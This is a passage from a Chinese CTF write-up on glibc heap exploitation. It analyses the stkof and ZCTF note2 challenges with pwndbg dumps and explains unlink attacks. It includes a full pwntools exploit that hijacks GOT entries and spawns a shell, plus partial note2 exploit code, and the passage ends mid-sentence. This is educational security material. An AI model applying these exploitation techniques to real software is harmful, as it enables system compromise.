fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u5f53\u5206\u914d16\u5927\u5c0f\u7684\u5185\u5b58\u540e\uff0c\u5806\u5e03\u5c40\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05430 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa3631, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 FASTBIN { prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x20bd1 } 0xe05430 PREV_INUSE { prev_size = 0, size = 134097, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u5f53\u4f7f\u7528 printf \u51fd\u6570\uff0c\u4f1a\u5206\u914d 1024 \u5b57\u8282\u7a7a\u95f4\uff0c\u5982\u4e0b *RAX 0x0 *RBX 0x400 *RCX 0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp rax, -0x1000 /* 'H=' */ *RDX 0x88 *RDI 0x400 *RSI 0x7fffffffd1c0 \u25c2\u2014 0x16 R8 0x0 *R9 0x0 *R10 0x0 *R11 0x246 *R12 0x1 *R13 0x7fffffffd827 \u25c2\u2014 0x31 /* '1' */ R14 0x0 *R15 0x400de4 \u25c2\u2014 and eax, 0x2e000a64 /* '%d\\n' */ *RBP 0x7ffff7dd2620 (_IO_2_1_stdout_) \u25c2\u2014 0xfbad2284 *RSP 0x7fffffffd1b8 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov rsi, rax *RIP 0x7ffff7a91130 (malloc) \u25c2\u2014 push rbp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x7ffff7a91130 <malloc> push rbp <0x7ffff7dd2620> \u3002\u3002\u3002\u7701\u7565 \u25ba f 0 7ffff7a91130 malloc f 1 7ffff7a7a1d5 _IO_file_doallocate+85 f 2 7ffff7a88594 _IO_doallocbuf+52 f 3 7ffff7a878f8 _IO_file_overflow+456 f 4 7ffff7a8628d _IO_file_xsputn+173 f 5 7ffff7a5ae00 vfprintf+3216 f 6 7ffff7a62899 printf+153 f 7 4009cd f 8 400cb1 f 9 7ffff7a2d830 __libc_start_main+240 \u5806\u5e03\u5c40\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05840 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa3631, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 FASTBIN { prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x411 } 0xe05430 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa4b4f, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05840 PREV_INUSE { prev_size = 0, size = 133057, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u6b64\u540e\uff0c\u65e0\u8bba\u662f\u8f93\u5165\u8f93\u51fa\u90fd\u4e0d\u4f1a\u518d\u7533\u8bf7\u7f13\u51b2\u533a\u4e86\u3002\u6240\u4ee5\u6211\u4eec\u6700\u597d\u6700\u521d\u7684\u7533\u8bf7\u4e00\u4e2a chunk \u6765\u628a\u8fd9\u4e9b\u7f13\u51b2\u533a\u7ed9\u7533\u8bf7\u4e86\uff0c\u65b9\u4fbf\u4e4b\u540e\u64cd\u4f5c\u3002 \u4f46\u662f\uff0c\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u5982\u679c\u6211\u4eec\u662f gdb.attach \u4e0a\u53bb\u7684\u8bdd\uff0c\u7b2c\u4e00\u4e2a\u7f13\u51b2\u533a\u5206\u914d\u7684\u5927\u5c0f\u4e3a 4096 \u5927\u5c0f\u3002 pwndbg> heap Top Chunk: 0x1e9b010 Last Remainder: 0 0x1e9a000 PREV_INUSE { prev_size = 0, size = 4113, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0x1e9b010 PREV_INUSE { prev_size = 0, size = 135153, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u7533\u8bf7\u7b2c\u4e00\u4e2a\u5806\uff080x48\uff09\uff0c\u4e4b\u540e\u8fd8\u4f1a\u51fa\u73b0\u7b2c\u4e8c\u4e2a\u7f13\u51b2\u533a\u5806\u5757\uff081040\uff09\uff1a //\u91cd\u65b0\u542f\u52a8\u8fc7\uff0c\u6240\u4ee5\u5730\u5740\u4e0e\u4e0a\u9762\u4e0d\u5bf9\u5e94\uff0c\u4f46\u662f\u7ed3\u6784\u662f\u4e00\u6837\u7684 pwndbg> heap 0xe05000 PREV_INUSE { prev_size = 0, size = 4113, fd = 0xa383231, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe06010 FASTBIN { prev_size = 0, size = 81, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe06060 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa4b4f, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u2026\u2026\u2026\u2026 \u57fa\u672c\u601d\u8def \u00b6 \u6839\u636e\u4e0a\u9762\u5206\u6790\uff0c\u6211\u4eec\u5728\u524d\u9762\u5148\u5206\u914d\u4e00\u4e2a chunk \u6765\u628a\u7f13\u51b2\u533a\u5206\u914d\u5b8c\u6bd5\uff0c\u4ee5\u514d\u5f71\u54cd\u4e4b\u540e\u7684\u64cd\u4f5c\u3002 \u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709 leak\uff0c\u8981\u60f3\u6267\u884c system \u7b49\u51fd\u6570\uff0c\u6211\u4eec\u7684\u9996\u8981\u76ee\u7684\u8fd8\u662f\u5148\u6784\u9020 leak\uff0c\u57fa\u672c\u601d\u8def\u5982\u4e0b\uff1a \u5229\u7528 unlink \u4fee\u6539 global[2] \u4e3a &global[2]-0x18\u3002 \u5229\u7528\u7f16\u8f91\u529f\u80fd\u4fee\u6539 global[0] \u4e3a free@got \u5730\u5740\uff0c\u540c\u65f6\u4fee\u6539 global[1] \u4e3aputs@got \u5730\u5740\uff0cglobal[2] \u4e3a &global[2]-0x18 \u3002 \u4fee\u6539 free@got \u4e3a puts@plt \u7684\u5730\u5740\uff0c\u4ece\u800c\u5f53\u518d\u6b21\u8c03\u7528 free \u51fd\u6570\u65f6\uff0c\u5373\u53ef\u76f4\u63a5\u8c03\u7528 puts \u51fd\u6570\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fd\u6570\u5185\u5bb9\u3002 free global[1]\uff0c\u5373\u6cc4\u6f0f puts@got \u5185\u5bb9\uff0c\u4ece\u800c\u77e5\u9053 system \u51fd\u6570\u5730\u5740\u4ee5\u53ca libc \u4e2d /bin/sh \u5730\u5740\u3002 \u4fee\u6539 global[1] \u4e3a /bin/sh \u5730\u5740\uff0c\u4fee\u6539 free@got \u4e3a system@got \u7684\u5730\u5740\uff0cfree chunk 1 \u5373\u53ef\u3002 unlink \u6211\u4eec\u641e\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u5806\u5373\u53ef\uff082&3\uff09\uff0c\u4e5f\u4e0d\u9700\u8981\u5173\u5fc3 chunk3 free \u65f6\u4f1a\u4e0e topchunk \u5408\u5e76\uff0c\u6240\u4ee5\u6ca1\u6709\u521b\u5efa\u4e00\u4e2a\u4fdd\u62a4\u5806\u5757\u3002 create ( 0x48 ) # 1 create ( 0x30 ) # 2 create ( 0x80 ) # 3 \u6700\u540e getshell \u505a\u6cd5\u548c wiki \u7565\u6709\u533a\u522b\u3002 EXP \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./stkof\" ) elf = ELF ( \"./stkof\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( size ): p . sendline ( '1' ) p . sendline ( str ( size )) p . recvuntil ( 'OK \\n ' ) def edit ( idx , size , content ): p . sendline ( '2' ) p . sendline ( str ( idx )) p . sendline ( str ( size )) p . send ( content ) p . recvuntil ( 'OK \\n ' ) def free ( idx ): p . sendline ( '3' ) p . sendline ( str ( idx )) def show ( idx ): p . sendline ( '4' ) p . sendline ( str ( idx )) globals = 0x0602140 ptr = globals + 0x10 create ( 0x48 ) # 1 create ( 0x30 ) # 2 create ( 0x80 ) # 3 # \u4f2a\u9020\u4e00\u4e2a\u5806\u5757\uff1b\u4fee\u6539chunk3 size\uff1b payload0 = p64 ( 0 ) + p64 ( 0x20 ) payload0 += p64 ( ptr - 0x18 ) + p64 ( ptr - 0x10 ) payload0 += p64 ( 0x20 ) payload0 = payload0 . ljust ( 0x30 , 'a' ) payload0 += p64 ( 0x30 ) + p64 ( 0x90 ) edit ( 2 , len ( payload0 ), payload0 ) # \u89e6\u53d1unlink free ( 3 ) p . recvuntil ( 'OK \\n ' ) # \u4fee\u6539global\u6307\u9488\u8868 payload1 = \"skye\" . ljust ( 0x8 , 'a' ) payload1 += p64 ( elf . got [ 'free' ]) # 0 payload1 += p64 ( elf . got [ 'puts' ]) # 1 payload1 += p64 ( globals - 0x8 ) # 2 edit ( 2 , len ( payload1 ), payload1 ) # overwrite free 2 puts edit ( 0 , 8 , p64 ( elf . plt [ 'puts' ])) # leak libc free ( 1 ) puts_addr = u64 ( p . recvuntil ( ' \\n OK \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"puts_addr:\" + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) system_addr = libc_base + libc . symbols [ 'system' ] log . success ( 'libc_base:' + hex ( libc_base )) log . success ( 'binsh_addr:' + hex ( binsh_addr )) log . success ( 'system_addr:' + hex ( system_addr )) # \u4fee\u6539global\u6307\u9488\u8868 payload2 = \"skye\" . ljust ( 0x8 , 'a' ) payload2 += p64 ( elf . got [ 'free' ]) # 0 payload2 += p64 ( binsh_addr ) # 1 edit ( 2 , len ( payload2 ), payload2 ) # overwrite free 2 system edit ( 0 , 8 , p64 ( system_addr )) # gdb.attach(p,'b *0x0400919') free ( 1 ) p . interactive () 2016 ZCTF note2 \u00b6 \u57fa\u672c\u4fe1\u606f \u00b6 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) note2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked \u5206\u6790\u7a0b\u5e8f \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u5148\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u4e3a \u6dfb\u52a0 note\uff0csize \u9650\u5236\u4e3a 0x80\uff0csize \u4f1a\u88ab\u8bb0\u5f55\uff0cnote \u6307\u9488\u4f1a\u88ab\u8bb0\u5f55\u3002 \u5c55\u793a note \u5185\u5bb9\u3002 \u7f16\u8f91 note \u5185\u5bb9\uff0c\u5176\u4e2d\u5305\u62ec\u8986\u76d6\u5df2\u6709\u7684 note\uff0c\u5728\u5df2\u6709\u7684 note \u540e\u9762\u6dfb\u52a0\u5185\u5bb9\u3002 \u91ca\u653e note\u3002 \u4ed4\u7ec6\u5206\u6790\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u51e0\u4e2a\u95ee\u9898 \u5728 create \u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8bb0\u5f55 note \u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u8be5\u5927\u5c0f\u4f1a\u7528\u4e8e\u63a7\u5236\u8bfb\u53d6 note \u7684\u5185\u5bb9\u3002\u81ea\u5b9a\u4e49\u51fd\u6570\u4e2d\u7684\u5faa\u73af\u53d8\u91cf i \u5b9a\u4e49\u4e3a int \u578b\uff0c\u4f46\u662f\u7528\u4e8e\u6bd4\u8f83\u7684\u4f20\u5165\u53c2\u6570\u5b9a\u4e49\u662f unsigned int \u3002 for ( i = 0L L ; length - 1 > i ; ++ i ) // \u9884\u7559\u6700\u540e\u4e00\u4f4d\u5199\u5165\\x00 // \u5806\u6ea2\u51fa\uff1alength\u4e3aunsigned int\uff0c\u5f53length\u7b49\u4e8e0\u65f6\uff0c\u7ed3\u679c\u662f\u4e00\u4e2a\u975e\u5e38\u5927\u6574\u6570 { v7 = read ( 0 , & buf , 1uLL ); if ( v7 <= 0 ) exit ( -1 ); // \u8bfb\u5165\u9519\u8bef\u9000\u51fa\u7a0b\u5e8f if ( buf == v4 ) // \u5224\u65ad\u7ed3\u675f\u7b26 break ; * ( _BYTE * )( i + ptr ) = buf ; } * ( _BYTE * )( ptr + i ) = 0 ; // \u5199\u5165\u7ed3\u675f\u7b26\\x00 return i ; \u5728 C \u8bed\u8a00\u4e2d\uff0c\u6211\u4eec\u7528 int \u548c unsigned int \u4e24\u79cd\u6570\u636e\u7c7b\u578b\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u4f1a\u81ea\u52a8\u8f6c\u6362\u4e3a unsigned int\uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u8f93\u5165 size \u4e3a 0 \u65f6\uff0cglibc \u6839\u636e\u5176\u89c4\u5b9a\uff0c\u4f1a\u5206\u914d 0x20 \u4e2a\u5b57\u8282\uff0c\u5373\uff1aprez_size,size,fd,bk\u3002\u56e0\u4e3a size \u4e3a 0 \uff0c\u7136\u540e\u9000\u51fa\u5224\u65ad\u6761\u4ef6\u4e3a\uff1asize-1 \uff0c\u90a3\u4e48\u9000\u51fa\u6761\u4ef6\u5c31\u6052\u6ee1\u8db3\uff0c\u7a0b\u5e8f\u8bfb\u53d6\u7684\u957f\u5ea6\u5c31\u4e0d\u53d7\u5230\u9650\u5236\uff0c\u6545\u800c\u4f1a\u4ea7\u751f\u5806\u6ea2\u51fa\u3002 \u7a0b\u5e8f\u5728\u6bcf\u6b21\u7f16\u8f91 note \u65f6\uff0c\u90fd\u4f1a\u7533\u8bf7 0xa0 \u5927\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u5728 free \u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3a NULL\uff0c\u5bf9\u505a\u9898\u6ca1\u6709\u5f71\u54cd\u3002\u4f46\u662f\u6ce8\u610f\u4e00\u4e0b\u6bcf\u6b21\u7f16\u8f91\u65f6\u53ef\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u662f\u5426\u80fd\u88ab\u5229\u7528\u3002\uff08\u540e\u9762\u6709\u8be6\u89e3\uff09 \u6f0f\u6d1e\u51fd\u6570 \u00b6 \u5728\u7f16\u8f91 create \u65f6\u8c03\u7528\uff0c\u5b58\u5728\u5199\u5165\u957f\u5ea6\u53ef\u63a7\uff0c\u9020\u6210\u5806\u6ea2\u51fa\u3002 for ( i = 0L L ; length - 1 > i ; ++ i ) // \u9884\u7559\u6700\u540e\u4e00\u4f4d\u5199\u5165\\x00 // \u5806\u6ea2\u51fa\uff1alength\u4e3aunsigned int\uff0c\u5f53length\u7b49\u4e8e0\u65f6\uff0c\u7ed3\u679c\u662f\u4e00\u4e2a\u975e\u5e38\u5927\u6574\u6570 { v7 = read ( 0 , & buf , 1uLL ); if ( v7 <= 0 ) exit ( -1 ); // \u8bfb\u5165\u9519\u8bef\u9000\u51fa\u7a0b\u5e8f if ( buf == v4 ) // \u5224\u65ad\u7ed3\u675f\u7b26 break ; * ( _BYTE * )( i + ptr ) = buf ; } * ( _BYTE * )( ptr + i ) = 0 ; // \u5199\u5165\u7ed3\u675f\u7b26\\x00 return i ; \u9020\u6210\u539f\u56e0\u524d\u9762\u6709\u8bf4\uff0c\u8fd9\u91cc\u6982\u8ff0\u4e00\u4e0b\uff1alength \u4e3a unsigned int \u5f53\u4e0e int \u7c7b\u578b\u8fd0\u7b97\u65f6\uff0c\u7ed3\u679c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u6362\u4e3a unsigned int \uff0c\u90a3\u4e48 length - 1 \u5c31\u80fd\u4ea7\u751f\u4e00\u4e2a\u5de8\u5927\u6b63\u6570\uff0c\u4ece\u800c\u65e0\u9650\u8f93\u5165\u3002 \u8fd8\u6709\u4e00\u4e2a\u5730\u65b9\u5c31\u662f edit \u529f\u80fd\u3002\u4e3b\u8981\u903b\u8f91\u662f\u521b\u5efa\u4e00\u4e2a 0xa0 \u7684\u5806\u5757\uff0c\u7528\u6765\u5b58\u653e tmp \u6570\u636e\u3001\u51c6\u5907\u5199\u5165\u88ab\u4fee\u6539 chunk \u7684\u6570\u636e\uff0c\u91cd\u70b9\u662f**\u6bcf\u6b21\u8f93\u5165\u4e34\u65f6\u6570\u636e\u957f\u5ea6\u90fd\u662f 0x90 ** my_input (( __int64 )( v8 + 15 ), 0x90LL , 10 ); \u4e00\u5f00\u59cb\u770b\u4e0a\u53bb\u662f\u5b58\u5728\u6ea2\u51fa\uff0c\u5047\u5982 chunk size \u4e3a 0x80 \uff0c\u5c31\u80fd\u6ea2\u51fa 0x90 \uff1f\u4e0d\u60f3\u591a\u4e86\uff0c\u5728\u8c03\u8bd5\u540e\u53d1\u73b0\u4e0d\u4f1a\u6ea2\u51fa\u7684\uff0c\u56e0\u4e3a\u6709\u8fd9\u4e00\u53e5\u8bdd\uff1a v1 [ chunk_size - strlen ( & dest ) + 14 ] = 0 ; \u7a0b\u5e8f\u4f1a\u5728 chunk size \u4e0a\u9650\u7684\u5730\u65b9\u5199\u5165\u4e00\u4e2a \\x00 \uff0c\u4ece\u800c\u907f\u514d\u4e86\u6ea2\u51fa\u3002\u6240\u4ee5\u6f0f\u6d1e\u5229\u7528\u70b9\u5c31\u53ea\u6709\u4e00\u4e2a\u3002 \u57fa\u672c\u601d\u8def \u00b6 \u8fd9\u91cc\u6211\u4eec\u5229\u7528\u53d1\u73b0\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u4e3b\u8981\u5229\u7528\u4e86 fastbin \u7684\u673a\u5236\u3001unlink \u7684\u673a\u5236\u3002 \u521b\u5efa 3 \u4e2a\u5806\u5757\uff0cchunk1 \u4e3a fastbin \uff0c\u5176\u4f59\u662f unsorted bin \u3002\u521b\u5efa chunk 0 \u5199\u5165\u6570\u636e\u65f6\uff0c\u5c06 fake chunk \u4e5f\u5199\u5165\u3002 \u91ca\u653e chunk 1 \uff0c \u7136\u540e\u518d\u6b21\u7533\u8bf7\u76f8\u540c\u5927\u5c0f\u7684 chunk \uff0c\u7531\u4e8e fastbin \u673a\u5236\uff0c\u4f1a\u4f7f\u7528\u539f\u6765 chunk 1 \u7684\u5730\u5740\u3002\u7533\u8bf7 size \u4e3a 0 \uff0c\u89e6\u53d1\u6f0f\u6d1e\u4fee\u6539 chunk 2 \u7684 prez_size \u548c prez_inuse \u3002 \u91ca\u653e chunk 2 \u89e6\u53d1 unlink hijack chunk list \u6307\u9488\u5217\u8868\u3002 \u57fa\u672c\u64cd\u4f5c \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u5148\u628a note \u53ef\u80fd\u7684\u57fa\u672c\u64cd\u4f5c\u5217\u4e3e\u51fa\u6765\u3002 # coding=UTF-8 from pwn import * p = process ( './note2' ) elf = ELF ( './note2' ) libc = ELF ( '/lib/x86_64-linux-gnu/libc.so.6' ) context . log_level = 'debug' def newnote ( length , content ): p . recvuntil ( 'option--->>' ) p . sendline ( '1' ) p . recvuntil ( '(less than 128)' ) p . sendline ( str ( length )) p . recvuntil ( 'content:' ) p . sendline ( content ) def shownote ( id ): p . recvuntil ( 'option--->>' ) p . sendline ( '2' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id )) def editnote ( id , choice , s ): p . recvuntil ( 'option--->>' ) p . sendline ( '3' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id )) p . recvuntil ( '2.append]' ) p . sendline ( str ( choice )) p . sendline ( s ) def deletenote ( id ): p . recvuntil ( 'option--->>' ) p . sendline ( '4' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id )) \u751f\u6210\u4e09\u4e2a note \u00b6 \u6784\u9020\u4e09\u4e2a chunk\uff0cchunk0\u3001chunk1 \u548c chunk2 payload = p64 ( 0 ) + p64 ( 0xa1 ) payload += p64 ( chunk_ptr - 0x18 ) + p64 ( chunk_ptr - 0x10 ) newnote ( 0x80 , payload ) newnote ( 0 , 'b' * 8 ) newnote ( 0x80 , 'c' * 8 ) \u5176\u4e2d\u8fd9\u4e09\u4e2a chunk \u7533\u8bf7\u65f6\u7684\u5927\u5c0f\u5206\u522b\u4e3a 0x80\uff0c0\uff0c0x80 \u3002chunk1 \u867d\u7136\u7533\u8bf7\u7684\u5927\u5c0f\u4e3a 0\uff0c\u4f46\u662f glibc \u7684\u8981\u6c42 chunk \u5757\u81f3\u5c11\u53ef\u4ee5\u5b58\u50a8 4 \u4e2a\u5fc5\u8981\u7684\u5b57\u6bb5 (prev_size,size,fd,bk)\uff0c\u6240\u4ee5\u4f1a\u5206\u914d 0x20 \u7684\u7a7a\u95f4\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u65e0\u7b26\u53f7\u6574\u6570\u7684\u6bd4\u8f83\u95ee\u9898\uff0c\u53ef\u4ee5\u4e3a\u8be5 note \u8f93\u5165\u4efb\u610f\u957f\u7684\u5b57\u7b26\u4e32\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cchunk0 \u4e2d\u4e00\u5171\u6784\u9020\u4e86\u4e24\u4e2a chunk chunk ptr[0]\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86 unlink \u65f6\u4fee\u6539\u5bf9\u5e94\u7684\u503c\u3002 chunk ptr[0]'s nextchunk\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86\u4f7f\u5f97 unlink \u65f6\u7684\u7b2c\u4e00\u4e2a\u68c0\u67e5\u6ee1\u8db3\u3002 // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ \u5f53\u6784\u9020\u5b8c\u4e09\u4e2a note \u540e\uff0c\u5806\u7684\u57fa\u672c\u6784\u9020\u5982\u56fe 1 \u6240\u793a\u3002 +-----------------+ high addr | ... | +-----------------+ | 'b'*8 | ptr[2]-----------> +-----------------+ | size=0x91 | +-----------------+ | prevsize | +-----------------|------------ | unused | +-----------------+ | 'a'*8 | ptr[1]----------> +-----------------+ chunk 1 | size=0x20 | +-----------------+ | prevsize | +-----------------|------------- | unused | +-----------------+ | \u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026 | fake ptr[0] chunk's nextchunk----->+-----------------+ | \u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026 | +-----------------+ | fakebk | +-----------------+ | fakefd | +-----------------+ | 0xa1 | chunk 0 +-----------------+ | 0 | ptr[0]----------> +-----------------+ | size=0x91 | +-----------------+ | prev_size | +-----------------+ low addr pwndbg> x /40gx 0x603000 0x603000: 0x0000000000000000 0x0000000000000091 0x603010: 0x0000000000000000 0x00000000000000a1 0x603020: 0x0000000000602108 0x0000000000602110 0x603030: 0x0000000000000000 0x0000000000000000 0x603040: 0x0000000000000000 0x0000000000000000 0x603050: 0x0000000000000000 0x0000000000000000 0x603060: 0x0000000000000000 0x0000000000000000 0x603070: 0x0000000000000000 0x0000000000000000 0x603080: 0x0000000000000000 0x0000000000000000 0x603090: 0x0000000000000000 0x0000000000000021 0x6030a0: 0x6262626262626262 0x0000000000000000 0x6030b0: 0x0000000000000000 0x0000000000000091 0x6030c0: 0x6363636363636363 0x0000000000000000 0x6030d0: 0x0000000000000000 0x0000000000000000 \u91ca\u653e chunk1 - \u8986\u76d6 chunk2 - \u91ca\u653e chunk2 \u00b6 \u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b deletenote ( 1 ) payload = 'a' * 0x10 payload += p64 ( 0xa0 ) + p64 ( 0x90 ) newnote ( 0 , payload ) deletenote ( 2 ) payload = 'a' * 0x18 + p64 ( atoi_got ) editnote ( 0 , 1 , payload ) shownote ( 0 ) \u9996\u5148\u91ca\u653e chunk1\uff0c\u7531\u4e8e\u8be5 chunk \u5c5e\u4e8e fastbin\uff0c\u6240\u4ee5\u4e0b\u6b21\u5728\u7533\u8bf7\u7684\u65f6\u5019\u4ecd\u7136\u4f1a\u7533\u8bf7\u5230\u8be5 chunk\uff0c\u540c\u65f6\u7531\u4e8e\u4e0a\u9762\u6240\u8bf4\u7684\u7c7b\u578b\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u5b57\u7b26\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u8986\u76d6 chunk2\uff0c\u8986\u76d6\u4e4b\u540e\u5982\u56fe 2 \u6240\u793a\u3002 +-----------------+high addr | ... | +-----------------+ | '\\x00'+'b'*7 | ptr[2]-----------> +-----------------+ chunk 2 | size=0x90 | +-----------------+ | 0xa0 | +-----------------|------------ | 'a'*8 | +-----------------+ | 'a'*8 | ptr[1]----------> +-----------------+ chunk 1 | size=0x20 | +-----------------+ | prevsize | +-----------------|------------- | ... | +-----------------+ | ... | fake ptr[0] chunk's nextchunk----->+-----------------+ | ... | +-----------------+ | fakebk | +-----------------+ | fakefd | +-----------------+ | 0xa1 | chunk 0 +-----------------+ | '0' *8 | ptr[0]----------> +-----------------+ | size=0x91 | +-----------------+ | prev_size | +-----------------+ low addr \u56fe2 pwndbg> x /40gx 0x603000 0x603000: 0x0000000000000000 0x0000000000000091 0x603010: 0x0000000000000000 0x00000000000000a1 0x603020: 0x0000000000602108 0x0000000000602110 0x603030: 0x0000000000000000 0x0000000000000000 0x603040: 0x0000000000000000 0x0000000000000000 0x603050: 0x0000000000000000 0x0000000000000000 0x603060: 0x0000000000000000 0x0000000000000000 0x603070: 0x0000000000000000 0x0000000000000000 0x603080: 0x0000000000000000 0x0000000000000000 0x603090: 0x0000000000000000 0x0000000000000021 0x6030a0: 0x6161616161616161 0x6161616161616161 0x6030b0: 0x00000000000000a0 0x0000000000000090 0x6030c0: 0x6363636363636300 0x0000000000000000 \u8be5\u8986\u76d6\u4e3b\u8981\u662f\u4e3a\u4e86\u91ca\u653e chunk2 \u7684\u65f6\u5019\u53ef\u4ee5\u540e\u5411\u5408\u5e76\uff08\u5408\u5e76\u4f4e\u5730\u5740\uff09\uff0c\u5bf9 chunk0 \u4e2d\u865a\u62df\u6784\u9020\u7684 chunk \u8fdb\u884c unlink\u3002\u5373\u5c06\u8981\u6267\u884c\u7684\u64cd\u4f5c\u4e3a unlink(ptr[0])\uff0c\u540c\u65f6\u6211\u4eec\u6240\u6784\u9020\u7684 fakebk \u548c fakefd \u6ee1\u8db3\u5982\u4e0b\u7ea6\u675f if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ unlink \u6210\u529f\u6267\u884c\uff0c\u4f1a\u5bfc\u81f4 ptr[0] \u6240\u5b58\u50a8\u7684\u5730\u5740\u53d8\u4e3a fakebk\uff0c\u5373 ptr-0x18\u3002 \u6cc4\u9732 libc \u5730\u5740 \u00b6 \u4ee3\u7801\u5982\u4e0b payload = 'a' * 0x18 + p64 ( atoi_got ) editnote ( 0 , 1 , payload ) shownote ( 0 ) p . recvuntil ( \"Content is \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) libc_base = leak_addr - libc . symbols [ 'atoi' ] system_addr = libc_base + libc . symbols [ 'system' ] onegadget = libc_base + 0xf1207 log . info ( \"leak_addr:\" + hex ( leak_addr )) log . info ( \"libc_base:\" + hex ( libc_base )) log . info ( \"system_addr:\" + hex ( system_addr )) log . info ( \"onegadget:\" + hex ( onegadget )) \u6211\u4eec\u4fee\u6539 ptr[0] \u7684\u5185\u5bb9\u4e3a ptr \u7684\u5730\u5740 - 0x18\uff0c\u6240\u4ee5\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 note0 \u65f6\uff0c\u53ef\u4ee5\u8986\u76d6 ptr[0] 